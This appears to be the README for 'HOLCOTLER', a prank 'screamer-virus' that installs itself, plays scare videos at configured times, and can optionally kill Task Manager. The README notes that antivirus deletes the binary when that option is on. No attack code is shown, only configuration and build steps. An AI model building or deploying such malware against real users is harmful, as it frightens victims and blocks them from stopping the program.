# HOLCOTLER
Created for fun screamer-virus

## CONFIG
Config file is `config.py`  
Example of config:
```python
#Activate times
#Examples 22:*:10; 12; *;
ACTIVATE = [
    ["20:14", False],
]

SCREAMERS_DIR = "screamers/"

#Enables taskmgr killer
#WARNING: MS Defender deletes the binary when toggled
KILL_TASKMGR = False


# INSTALL

#Directories to create
DIRS = [
    "screamers"
]

#Files to copy
FILES = [
    "main.exe",
    "screamers\\1.mp4"
]

#Files to run
RUN = [
    "main.exe"
]

```

## BUILD
* Run `install.bat` to install all dependencies (Requires pip)
* Configure in `config.py` (Optional)
* Run `build.bat` and get your binaries in bin/

## Install
* Run `fastinstaller.exe`
* Profit